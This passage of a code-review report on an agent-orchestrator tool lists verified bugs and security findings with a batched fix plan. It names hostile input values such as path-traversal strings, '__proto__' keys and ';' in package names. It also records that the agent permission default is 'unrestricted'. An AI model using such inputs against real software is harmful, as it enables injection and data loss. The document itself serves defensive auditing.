**Proof (verified):** `validateStory` checks unknown IDs only (no cycle check); `mergeAll` calls `topologicalSort` first thing — the `visiting.has(storyId)` cycle branch throws (merge.ts:282-284) with no try/catch in `mergeAll` or `runParallelBatch` (execution/parallel-batch.ts:282). Sequential mode silently ends with the two stories forever `pending`/`"running"`.
**Fix:** Cycle-check in `validateStory`/`validatePlanOutput`; defensively catch in `mergeAll` → per-story `failureKind: "error"`.

#### BUG-28: `create()` unconditionally force-deletes `nax/<storyId>` — can destroy a user's real branch
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/worktree/manager.ts:98-108`
**Proof (verified):** `git branch -D nax/<storyId>` runs unconditionally (in try/catch, but `-D` force-deletes; the catch only fires on spawn error, and the exit code is ignored via bare `await branchProc.exited`). Any user branch named `nax/<id>` — unmerged commits included — is destroyed the moment a matching story ID runs.
**Fix:** Only delete when the branch is known-orphaned (verify worktree list / `git branch --list --format='%(worktreepath)'` first), or scope deletion to branches whose tree matches the worktree path.

#### BUG-29: `findRelatedStories` fallback returns the *first* 5 passed stories, not the *most recent*
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/acceptance/fix-generator.ts:94-96`
**Proof (verified):** `passedStories.slice(0, 5)` with a comment claiming "most recent" — takes first five in PRD order, so an unrelated early story can pin the fix story to the wrong package directory (inherited `workdir`).
**Fix:** `[...passedStories].reverse().slice(0, 5)` or sort by completion recency.

#### MED-01: Secret-redaction gaps — PEM keys, JWTs, auth headers, short keys pass through

**Status:** ✅ Fixed — PR #1591. Went through three tuning passes: the initial patterns over-redacted ordinary prose ("Basic authentication failed") and had a tight PEM bound that could miss large legitimate cert-chain bundles (caught by code review + an automated security review) — final version requires credential-shaped values and bounds the PEM gap at 64KB.
**Severity:** MEDIUM | **Category:** Security
**File:** `src/logger/redact.ts:21-30`
**Proof (verified):** `SECRET_VALUE_PATTERNS` covers `sk-`, `ghp_`, `npm_`, `AKIA`, `xox*`, `KEY=value` only; `SECRET_KEY_PATTERN` inspects object keys only. PEM blocks, `eyJ...` JWTs, `Bearer`/`Basic` headers, and short keys in free text pass through into the JSONL and terminal.
**Fix:** Add patterns for PEM/JWT/Bearer/Basic and key-name captures (`x-api-key`, `Authorization`) in free text.

#### MED-02: Logger serialization crashes the caller — circular refs stack-overflow redaction; BigInt/circular blow up `JSON.stringify`
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/logger/redact.ts:70-81`, `src/logger/formatters.ts:84`
**Proof (verified):** `redactValue` recurses with no visited set — a circular `data` object throws `RangeError` synchronously out of `logger.info()/error()` into the caller; BigInt passes redaction then `JSON.stringify` (formatters.ts:84) throws in `formatJsonl`, aborting whatever stage was logging (and losing the line).
**Fix:** WeakSet + max-depth guard in `redactValue` (return `"[unserializable]"`); wrap `formatJsonl`/console `JSON.stringify` in try/catch emitting a placeholder line.

#### MED-03: `checkAgentCLI` reads a removed config field — always validates the wrong binary
**Severity:** MEDIUM | **Category:** Bug
**File:** `src/precheck/checks-cli.ts:44`
**Proof (verified):** `config.execution?.agent || "claude"` — `ExecutionConfigSchema` has no `agent` field (agent config lives at `config.agent.default`), so the Tier-1 blocker always runs `claude --version`: greenlights runs whose real default agent is missing, falsely blocks when claude is absent but the configured agent is installed. Also violates the AGENTS.md rule.
**Fix:** Resolve via `resolveDefaultAgent(config)` / `agentManager.getDefault()`.

#### MED-04: Unguarded git spawns — no deadline on deferred-review ref capture and output capture
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/execution/deferred-review.ts:32-55`, `src/utils/git.ts:469,545`
**Proof (verified):** these spawns await stdout/`proc.exited` with no timeout (unlike `gitWithTimeout`'s 10s SIGKILL). `captureRunStartRef` is awaited at the very start of `executeUnified` (unified-executor.ts:107) — a wedged git (NFS hang, credential prompt) stalls the entire run before crash handlers can even register the PID. `utils/git.ts` also reads stdout before awaiting exit (sequential-drain pattern).
**Fix:** Route through `gitWithTimeout` / `boundedProcRead`-style deadline.

#### MED-05: No logger flush on process exit — tail of the run JSONL silently lost
**Severity:** MEDIUM | **Category:** Reliability
**File:** `src/logger/logger.ts:224-226`; `bin/nax.ts:830,156,187,200`
**Proof (verified):** `Logger.flush()` exists but no production caller uses it (grep: only `runtime/index.ts:347` flushes auditors); batched `appendFile` runs on a later microtask, so `process.exit` paths terminate before the drain — `run.end`/final error lines never hit disk.
**Fix:** Await `flush()` in CLI exit paths (or a synchronous drain on `process.on("exit")`).

### 🟢 LOW (selected)

- **L1** `src/execution/lifecycle/run-setup.ts:322` — `Bun.spawnSync` git on the main thread during setup.
- **L2** `src/execution/unified-executor.ts:554,647` — uncancellable `Bun.sleep` for `iterationDelayMs` (violates own convention).
- **L3** `src/execution/status-file.ts:319` — `includes("../")` traversal check trivially bypassable (`..//`, absolute paths); internal inputs, low impact.
- **L4** `src/execution/parallel-batch.ts:294-303` — non-conflict merge errors orphan the worktree directory.
- **L5** `src/pipeline/runner.ts:103` — `stageCostAccum += result.cost` — missing `cost` poisons accumulator to NaN.
- **L6** `src/pipeline/stages/queue-check.ts:186` — INJECT reads unbounded JSON file into memory (traversal correctly blocked).
- **L7** `src/pipeline/subscribers/registry.ts:53` — feature name flows unvalidated into runs-dir path construction.
- **L8** `src/review/runner.ts:220-239` — `getUncommittedFilesImpl` reads stdout after `proc.exited` — pipe deadlock risk on >64KB diff output.
- **L9** `src/tdd/isolation.ts:122-129` — `new RegExp` from user glob patterns with regex metacharacters throws.
- **L10** `src/prd/index.ts:253-275` — `markStoryFailed` on an already-passed story leaves `passes: true`.
- **L11** `src/utils/llm-json.ts:36-38` — `stripTrailingCommas` corrupts string values containing `,}`/`,]`.
- **L12** `src/utils/command-argv.ts:56-60` — `parseCommandToArgv` expands `~` inside quotes and drops empty args.
- **L13** `src/commands/unlock.ts:25-33` — EPERM treated as dead; `nax unlock` can remove a live run's lock.
- **L14** `src/commands/logs-formatter.ts:135-167` — `followLogs` stalls on rotation, crashes on deletion, O(n²) re-read per poll.
- **L15** `bin/nax.ts:133-170` — `promptForConfirmation` hangs on stdin EOF; raw mode not restored in a `finally`.
- **L16** `src/cli/runs.ts:59` — all-or-nothing JSONL parse; one truncated final line blanks `nax runs list/show`.
- **L17** `src/commands/detect.ts:159-163`, `src/commands/resume.ts:156`, `src/cli/accept.ts:73` — `--package`/`-f` feature names lack containment/validation (CLI-only; `run`/`features create` are guarded).
- **L18** `src/agents/shared/model-resolution.ts:7,31-38` — `resolveBalancedModelDef` placeholder with stale header and loose casts.
- **L19** `src/routing/router.ts:276-283,351` — dead surface: unused `routeStory`, unused `_workdir` param; `llm.ts:87-92` spawn remnants.
- **L20** `src/interaction/plugins/webhook.ts:120,237,294` — `registeredRequestIds` Set unbounded.
- **L21** `src/logger/sink-registry.ts:36-43` — shallow clone does not provide claimed redaction isolation (nested `data` shared).
- **L22** `src/logger/logger.ts:208-211` — `MAX_BATCH_BYTES` counts UTF-16 units, not bytes.
- **L23** `src/log-format/formatter.ts:138,162,207,251` — `entry.data` dereferenced without null guard in headless mode.
- **L24** `src/precheck/checks-system.ts:41` — language-agnostic dependency-dir blocker false-positives on Go/Java/Rust.
- **L25** `src/precheck/checks-git.ts:10,63` — precheck subprocesses spawn without timeouts; `df -k .` checks cwd not workdir.
- **L26** `src/execution/crash-heartbeat.ts:43-50` — stop→start can log a spurious "loop crashed" warning.
- **L27** `src/execution/unified-executor.ts:464-556` — parallel single-story dispatch skips `maybeSendCostWarning`.
- **L28** `src/execution/runner-execution.ts:41`, `runner-completion.ts:55` — `statusWriter: any` in public interfaces.
- **L29** `src/pipeline/events.ts:8` — `node:events` EventEmitter vs "Bun-native only" rule; `src/verification/smart-runner.ts:516-517` dangling doc comment.
- **L30** `src/config/validate.ts` — dead deprecated module; `runtime-types.ts` (588) hand-synced parallel type layer — drift magnet.
- **L31** `src/config/loader.ts:39-55` — `findProjectDir` silently drops project layer beyond depth 10; `loader.ts:220-225` throws plain `Error` not `NaxError`.
- **L32** `src/context/rules/canonical-loader.ts:120-174` — neutrality linter bans only two XML tags (hardening).
- **L33** `src/config/permissions.ts:44-50` — `skipPermissions` field is dead output; `execution.permissions` schema block parses but is never read (silent no-op config).
- **L34** `src/prd/types.ts:247`, `src/plugins/registry.ts:53-63`, `src/review/semantic-debate.ts:114` — type-safety nits (`as` casts, shape sniffing instead of tagged unions).
- **L35** `src/acceptance/generator.ts:50-63` — `acceptance.command` containing shell operators silently loses semantics (per-part quoting).
- **L36** `src/verification/executor.ts:212-218` — `appendFlag` splits on first `|`/`>` even inside quoted args.
- **L37** `src/acceptance/fix-generator.ts:133-144` — comment/code drift in group-cap merging.
- **L38** Oversized files vs own conventions: `bin/nax.ts` (1980), `src/prompts/rectifier-builder.ts` (902), `src/pipeline/stages/parser.ts` (597), `src/context/engine/providers/static-rules.ts` (591), `src/config/runtime-types.ts` (588), `src/commands/curator.ts` (577), `src/config/schemas.ts` (574), `src/pipeline/stages/acceptance-setup.ts` (528), `src/verification/smart-runner.ts` (538), `src/metrics/tracker.ts` (472).

---

## Discarded Findings

### SEC-01 (discarded): Default permission profile is `unrestricted` (approve-all)

**Original claim:** schema default + resolver fallback both `"unrestricted"` contradict the "safe" default documented in `docs/architecture/agent-adapters.md` §14; legacy `dangerouslySkipPermissions` configs silently escalate to `--approve-all`.

**Verified facts:** the code behavior was real — `src/config/schemas.ts:141` and `schemas-execution.ts:188` default `permissionProfile` to `"unrestricted"`, `resolvePermissions` (permissions.ts:40) falls back to `"unrestricted"`, and `spawn-client-session.ts:118` maps `approve-all` → `--approve-all`. `docs/architecture/agent-adapters.md:62` still documents "Neither set → defaults to `safe`".

**Decision:** **Discarded per maintainer instruction.** Rationale as understood: the permissive default is an intentional product posture for an orchestrator that runs agentic work on the user's own repo (approve-reads would break agent write flows unless explicitly configured), and the docs/AGENTS.md wording is stale documentation rather than an actual security regression. Residual recommendations (not findings): (1) update `docs/architecture/agent-adapters.md` §14 + AGENTS.md to document the actual default; (2) consider a one-time warn when a legacy `dangerouslySkipPermissions: false` config is detected, since that key no longer exists anywhere in src; (3) the undefined-config fallback in `resolvePermissions` (`?? "unrestricted"`) means a wiring regression upstream would silently escalate — a `warn`-on-missing-config or fail-closed default would make such a regression visible.

---

## Fix Plan (handover)

Grouped into batches that share a subsystem and a mental model, so each batch is one focused session with one commit series. Batches are independent of each other — do them in order, but they do not depend on each other's changes.

### Working rules for the implementer

- **Re-verify before fixing.** Read the cited `file:line` first. Findings outside the re-verified list in the Verification Addendum have one verification pass, not two.
- **One concern per commit**, conventional-commit prefix (`fix:`, `refactor:`). Reference the finding ID in the subject, e.g. `fix: shell-quote {{package}} in scoped test template (SEC-02)`.
- **Test first** where the finding is behavioral (all of Batch 1, 3, 4, 5). A regression test that fails before the fix is the deliverable, not an extra.
- Follow `.claude/rules/` — `_deps` injection over `mock.module()`, `NaxError` with `cause`, no magic numbers, Bun-native APIs.
- Do **not** widen scope. Several findings sit next to tempting refactors (e.g. BUG-01 in `status-writer.ts`, BUG-05 in `loader.ts`); fix the defect, leave the refactor.
- After each batch: `bun run lint`, `bun run typecheck`, and the targeted tests. Full suite (1,129 files) at batch end, not per commit.

### Batch 1 — P0. Ship first. (6 findings, all S)

Highest blast radius, all small diffs. The correct pattern already exists in-repo for four of the six.

| ID | Fix | File | Pattern to copy |
|:---|:---|:---|:---|
| SEC-02 | Shell-quote the substituted package name, or reject names outside `[A-Za-z0-9_./@-]` | `quality/command-resolver.ts:73-75` | `shellQuoteArg` in `verification/shell-quote.ts` |
| BUG-01 | Defer the call into the chain: `this._mutex = this._mutex.then(() => this._doUpdate(...))` | `execution/status-writer.ts:212-213` | `writeFeatureStatus` at :265-279, same file |
| BUG-02 | Add `detached: true` to the spawn | `quality/runner.ts:114-120` | `executeWithTimeout` at `verification/executor.ts:86-92` |
| SEC-05 | Mask before printing the default view | `cli/config-display.ts:98` | `maskProfileValues` in `cli/config-profile.ts:95-109` |
| SEC-03 | Delete the `isAbsolute` fallback (or contain via `validateModulePath` against repoRoot/workdir) | `review/semantic-evidence.ts:150-156` | the loop directly above it |
| BUG-04 | Route through `runQualityCommand`, or add a hard timeout + `killProcessGroup` escalation with `timeoutMs` from `ctx.config.acceptance` | `acceptance/hardening.ts:158-164` | `quality/runner.ts:136-145` |

**Tests:** SEC-02 — a package name containing `;` must not reach the shell unescaped. BUG-01 — two concurrent `update()` calls must not interleave their writes. BUG-04 — a hanging test command must terminate at the deadline.

### Batch 2 — Config integrity (7 findings, all in `src/config/`)

One session; they interact, so fix together and validate once at the end.

- **BUG-05** — the no-profile package-overlay path returns at `loader.ts:337` with no guards and no `safeParse`. Hoist `rejectLegacyAgentKeys` / `rejectLegacyRectificationKeys` / `rejectDeadQualityFlags` / `rejectUnimplementedScopedProfile` + `NaxConfigSchema.safeParse` to cover **both** package paths. Do this one first — it is the gate the others assume exists.
- **BUG-06** — gate on `!= null` in `hasAnyMergeableField` and every merge branch (`merge.ts:50-79`); `agent: null` currently dereferences at :73.
- **SEC-07** — skip `__proto__` / `constructor` / `prototype` keys in `deepMergeConfig` (`merger.ts` key loop), and mirror it in the `constitution` special case at :97.
- **SEC-08** — validate `profileName` as a single path segment at all three entry points (`profile.ts:25-26`, `:63-64`, and the project-config `profile` field read at `:174`). Guard exists at `fragments/store.ts:75-89`.
- **BUG-20** — derive the outer `ExecutionConfigSchema.default({...})` literal from the inner schema; the `context` block at `schemas.ts:309` shows the pattern.
- **BUG-21** — fold `process.env` into the base map in `loadProfileEnv`, and wrap the `resolveString` throw in `NaxError` with profile name + key path.
- **MED-03** — `checks-cli.ts:44` reads `config.execution?.agent`, which does not exist in the schema. Resolve via `resolveDefaultAgent(config)`.

**Tests:** a per-package config with `permissionProfile: "scoped"` must be rejected; `agent: null` must produce a Zod error naming the key, not a TypeError; a config containing `__proto__` must not alter the merged object's prototype; `profile: "../../foo"` must be rejected.

### Batch 3 — Hang & liveness (6 findings)

Each one can wedge a run indefinitely. Shared fix vocabulary: a deadline race plus a logged drop.

- **BUG-14** — `event-bus.ts:284-298,330-333`: race each tracked promise against a settle deadline in `drain()`; drop and log on timeout. Highest impact — `drain()` runs at every story boundary.
- **MED-04** — `deferred-review.ts:32-55` and `utils/git.ts:469,545`: route through `gitWithTimeout`. `captureRunStartRef` is awaited at the top of `executeUnified` (`unified-executor.ts:107`), before crash handlers register a PID, so a wedged git is unrecoverable.
- **BUG-13** — wrap the completion-stage stream reads in the existing `raceWithDeadline` (`completion.ts:285-297,329-341`).
- **BUG-18** — AbortController timeout (~30s) on the webhook `send()` fetch (`webhook.ts:253-258`); deadline race in `adapter.ts:486-490`'s context-tool path. Telegram's explicit timeouts are the reference.
- **BUG-24** — `try/finally { await runtime.close(); }` around the story loop in `prompts-main.ts`.
- **MED-05** — await `Logger.flush()` in the CLI exit paths (`bin/nax.ts:830,156,187,200`). Do this one last in the batch: without it you lose the log tail that diagnoses the other five.

### Batch 4 — Silent wrong outcomes (7 findings)

These do not crash; they produce a wrong verdict. Every fix needs a test pinning the corrected behavior.

- **BUG-26** — `prd/schema.ts:217-223` downgrades to `no-test` on *any* non-empty justification string, so a planner emitting `test-after` plus a stray note loses all test generation. Keyword-gate it or drop the auto-downgrade. Highest-impact of the batch.
- **BUG-12** — `acceptance.ts:234-294`: treat `exitCode !== 0 && failedACs.length > 0 && actualFailures.length === 0` as failure. A crashed suite alongside overridden ACs currently reports "All packages passed".
- **BUG-17** — `triggers.ts:129-208`: route every trigger through `chain.applyFallback` before comparing `response.action`. `checkCostExceeded` is a live gate and currently *proceeds* on timeout even when its fallback is `abort`.
- **BUG-25** — thread the retry budget into `isStalled` (`prd/types.ts:268-289`) so a `failed` story with `attempts <= maxRetries` is not counted as blocked.
- **BUG-10**, **BUG-11**, **BUG-29** — queue-lock liveness, queue re-application after a crash, and `passedStories.slice(0, 5)` taking the first five rather than the most recent.

### Batch 5 — Destructive / data-loss (4 findings)

- **BUG-28** — `worktree/manager.ts:98-108` runs `git branch -D nax/<storyId>` unconditionally; a user branch of that name with unmerged commits is destroyed on an ID collision. Delete only when the branch is known-orphaned.
- **BUG-07** — `execution/lock.ts:68-96`: unlink conditionally on unchanged content, or rename the stale lock to a tombstone before re-creating.
- **BUG-09** — best-effort `try/catch` inside `appendProgress` (`execution/progress.ts:23-27`). All callers sit on terminal failure paths, so an unwritable `featureDir` currently crashes the failure handler and skips `markStoryFailed` / `savePRD`.
- **MED-02** — WeakSet + max-depth guard in `redactValue`; `try/catch` around `formatJsonl`'s `JSON.stringify`. A circular object in log data currently throws `RangeError` out of `logger.info()` into the caller.

### Batch 6 — P2. Dead or inert surfaces (10 findings)

**Status: ✅ Fixed — PR #1591** (see "Status update" near the top of this doc). Real defects, but no live user impact — schedule after Batches 1–5.

BUG-03 (bake-off crashes on every invocation; `_contestantDeps` has zero installation sites in `src`/`bin` — also move `worktreeManager.create` inside the try so failure yields `dnf-crashed`), BUG-19 (registry stubs return `[]`), BUG-16 (`forceStop` implemented nowhere — implement or delete the branch), BUG-15 (per-model `env` never threaded), BUG-23 (`--json` ignored on a TTY), BUG-22 (TUI quit/exit paths), BUG-27 (dependency-cycle validation), SEC-06, SEC-09, MED-01.

### Batch 7 — P3. Cleanup (still pending)

L1…L38. Pull **L5** (NaN cost accumulator), **L8** (pipe deadlock on >64KB diff output), and **L13** (`nax unlock` removing a live run's lock) forward into Batch 6 — they have live failure modes; the rest are hygiene.

## Verified Clean (no findings)

- **Crash/signal handling** (`crash-signals.ts`, `crash-writer.ts`, `pid-registry.ts`) — idempotent, abort-propagating, identity-checked kill sweeps.
- **Checkpoint system** — torn-line tolerance, per-run filtering, capture-failure sentinel.
- **story-orchestrator / rectification / phase-eval / non-blocking-fix** — hardened against oscillation, stale verdicts, flake laundering.
- **Runtime middleware** (audit/cost/logging/watchdog) — listener guards, drain caps, timer cleanup.
- **`src/agents/cost/`**, acp parser/line-reader (capped buffering), `spawn-client-process.ts` kill-tree escalation, Telegram plugin (chat-id filter, backoff).
- **`src/verification/` shell-quoting, `globToRegex`, mutation subsystem, flake-probe** — all correct.
- **`src/config/migrations.ts`, `path-security.ts`, `fragments/store.ts`, compat-shims warn chain** — exemplary.
- **`src/debate/`, `src/project/`, `src/analyze/`, `src/metrics/`, `src/schedule/`, `src/hooks/`, PRD extraction parsers, `src/findings/`, `mutation-check.ts`, `porcelain.ts`, curator** — clean.
- All `JSON.parse` on external data is inside try/catch; no `eval`/`new Function`; no hardcoded credentials in src; all `Bun.spawn*` use argv arrays except the two flagged shell paths.

## Scope Notes

- **Verification method (rev 2):** every finding above was re-read at the cited `file:line` and confirmed against source (proof snippets included); three findings were re-worded to exact code behavior (SEC-06, BUG-13, BUG-22); one finding discarded (SEC-01). LOWs were spot-verified; they inherit the subagent reads.
- **Not run:** full test suite (1,129 files) — lint, typecheck, and targeted tests green instead; runtime behavior of Bun pipe-close-after-SIGKILL, acpx permission-mode interplay, and Ink exit hooks unverified.
- **By-design, not flagged:** plugin/hook arbitrary code execution (documented trust boundary), repo-supplied context as trusted input, worktree retention on conflict rectification.
- **Recommendation:** work the batches in "Fix Plan (handover)" in order. Batch 1 lands in one session; Batches 2–5 are one session each. Re-run this review after Batch 5.
- **Findings not re-verified in rev 3** carry a single verification pass — read the cited line before changing anything, and if the code no longer matches the proof snippet, record that in the commit rather than inventing a fix.
